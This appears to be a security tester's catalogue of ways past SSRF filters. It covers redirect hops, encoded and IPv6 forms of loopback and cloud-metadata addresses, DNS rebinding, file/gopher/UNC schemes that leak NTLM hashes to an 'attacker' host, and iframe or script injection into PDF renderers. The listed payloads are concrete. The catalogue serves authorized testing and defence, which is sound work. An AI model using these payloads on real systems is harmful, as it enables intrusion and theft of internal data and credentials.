# SSRF filter-bypass catalogue

Use when an obvious internal payload (`http://127.0.0.1`, `http://169.254.169.254`, `http://localhost`) is rejected. Rejection means a filter exists; it is almost always a blocklist applied to the *input text* rather than to the final, resolved, post-redirect destination. Work the ladder below and, after any vendor patch, run the whole ladder again (the WooCommerce case was re-exploited five times this way, note 23).

Payload shapes are illustrative templates, not copied from any source. `TARGET` = the internal address you are authorized to probe (your own first).

## 0. Decide blocklist vs allowlist
- **Blocklist** (feature must reach arbitrary external sites, only internal ranges blocked): most common. Attack with redirects, encodings, DNS, protocols below.
- **Allowlist** (only specific domains allowed): attack the allowed domains. Find an open redirect on an allowed domain, or exploit weak matching (allowed name used as a subdomain or path of your domain, e.g. `allowed.com.attacker.com` or `attacker.com/allowed.com`). (note 28)

## 1. Redirects (highest value in this set)
Point the feature at a server you control; answer with a 3xx whose `Location` is `TARGET`. The filter validates the first URL (yours, which passes); the client follows the redirect to the internal address, often without re-validating.
- **Test every status code separately:** 301, 302, 303, 307, 308. Omise followed *only* 303 (note 13). 307/308 preserve method and body.
- Make the redirector take a `?target=` param so you can iterate hosts/ports without editing server config (note 09).
- Redirect is also the universal bypass for IP-notation and IPv6 filters: the final hop is where the internal address lives. (notes 09, 13, 21, 23, 28)
- Open-redirect-as-a-service / public redirect endpoints work as the hop when you cannot host (note 23).

## 2. IPv6 address forms
Use when only IPv4 literals are blocked.
- `http://[::]` and `http://[::]:PORT`: unspecified address, routes to local host (Slack, note 21).
- `http://[::1]`: IPv6 loopback.
- IPv4-mapped: `http://[::ffff:169.254.169.254]` or hex-compressed `http://[::ffff:a9fe:a9fe]` for the metadata address (HackerOne webhook, note 09).
- Combine with a redirect hop if the first URL is validated.

## 3. IP-notation encodings
Defeat exact-string and naive-regex comparisons. For loopback `127.0.0.1` / metadata `169.254.169.254`:
- **Octal:** `0177.0.0.1`, zero-padded `0177.0000.0000.0001`.
- **Hex:** `0x7f.0.0.1`, or full `0x7f000001`.
- **Dword (single 32-bit decimal):** `2130706433` (= 127.0.0.1); metadata `2852039166`.
- **Short forms:** `127.1`, `0` (resolves to 0.0.0.0 -> local on some stacks).
- **Zero-padded octets:** `127.000.000.001`.
- **Mixed:** combine hex/octal/decimal across octets.
- **Percent-encoding** of hostname characters (e.g. `localhost` -> `%6c%6f...`).
- **Short forms are often more reliable than dword:** in testing, `127.1` passed a host blocklist where the dword `2130706433` was rejected as "Invalid host" by the HTTP stack. Try `127.1` and octal before dword.
- **Blocked path segments, not just the host:** a filter may block both the internal host *and* a sensitive path like `/admin` as separate layers. Obfuscate the path too, independently of the host: single URL-encode a character (`/%61dmin`) and, if that is decoded-then-rechecked, double URL-encode it (`/%2561dmin`). Which depth works depends on how many times the app decodes before checking, so try single first, then double. (Validated against PortSwigger "SSRF with blacklist-based input filter": `http://127.1/%61dmin` reached the panel; plain `/admin` and double-encoded `/%2561dmin` did not.)
(GitLab note 22, WooCommerce note 23, Nextcloud note 17, Vickie Li note 28, eval case-03)

## 4. DNS-based
- **DNS rebinding:** a hostname (from a public rebinding service) that resolves to a harmless public IP at validation time and to `TARGET` (metadata/loopback) at fetch time. Beats filters that resolve-and-check once but re-resolve at connect (check/use gap). (Concrete CMS note 15; headless-browser tooling in note 27.)
- **DNS pointing:** set an A record on your own domain straight to an internal IP; passes hostname-based allowlists that never expected your domain to resolve internally (note 28).
- **Resolver quirk (Ruby Resolv, CVE-2017-0904):** `Resolv.getaddresses` returns `[]` for some shorthand/octal/hex/zero-padded IPv4 spellings, so a blocklist sees "no private IP" and passes, while the OS `inet_aton` still connects to loopback. Any Ruby SSRF filter built on Resolv (e.g. old `private_address_check`) is suspect. Gems that fail closed on empty (`ssrf_filter`) or use `Addrinfo.getaddrinfo` (`faraday-restrict-ip-addresses`) are safe. (GitLab note 22, HackerOne Integrations note 16.) General lesson: whenever the validator and the HTTP client parse the host with different resolvers, any string they disagree on is a bypass.

## 5. Unicode / normalization
Host strings that are "not an IP" to the validator but normalize to one at connect time:
- Unicode enclosed-alphanumerics (circled digits) for `169.254.169.254`.
- Fullwidth/ideographic dots as octet separators.
(Nextcloud, found by white-box review, note 17.)

## 6. Alternate protocols / schemes
Try when `http(s)` is filtered, or to reach non-HTTP internal services or local files.
- `file://`: local file read (PlayStation second hop note 12; FFmpeg concat/subfile note 07).
- UNC / SMB: `\\attacker\share` or `file://attacker/share` on Windows image pipelines leaks the service account NTLMv2 hash for offline cracking or relay (Rockstar note 10).
- `gopher://`: craft raw TCP payloads (e.g. to internal Redis/SMTP); `dict://`, `ssh://` named in the talk (note 27).
- FFmpeg HLS: an uploaded `.avi` that is actually an `#EXTM3U` playlist with `concat:`/subfile entries reads local files line by line via `file://` (note 07).

## 7. Markup injection into renderers (no URL field)
When the fetch happens inside a server-side renderer, inject the fetch:
- HTML-to-PDF / screenshot: `<iframe src="http://TARGET">`, `<script>` that `fetch()`/`XMLHttpRequest`s TARGET and writes the response into the document, `<img src>`. Use top-level redirect if iframes to metadata are frame-blocked (Shopify note 20).
- **Style-only input:** break out of a `<style>` context with `</style>` then inject HTML (note 27).
- **SVG:** `<image xlink:href="http://TARGET">` or a UNC path (notes 10, 14).
- **PDF object injection:** unescaped parenthesis in an annotation URI lets you add dictionary entries and a JS `submitForm` action that POSTs blind; multi-byte characters can smuggle escape chars (note 26).
- **Engine-specific:** WeasyPrint `<link rel=attachment href=...>` embeds fetched content as a PDF attachment; Prince XXE (CVE-2018-19858); template-injection (ERB) if arithmetic in `{{ }}`/`<%= %>` evaluates (note 27).

## 8. Second-request / multi-step gaps
Multi-step fetchers (ranged/chunked download, resume, retry) may validate only the first request. Answer request one normally (or with a short body under a large declared `Content-Length`) and misbehave on request two: redirect it to `TARGET`. Vimeo's chunked importer followed the second-request redirect to GCP metadata (note 18).

## 9. WAF / fresh-request dodges
- Make the renderer load a *cached* resource instead of a fresh request to slip a WAF (note 26).
- Legacy metadata endpoints that skip header requirements (see escalation reference): a filter on the canonical path may miss `/computeMetadata/v1beta1/...`.

## Testing discipline
- Prove each bypass against **your own** host/port first. Only point at real internal/metadata addresses with explicit scoped authorization.
- Timing varies; automated scanners were unreliable in several reports (notes 02, 09). Manual, low-rate probing is often necessary and is also kinder to scope rules.
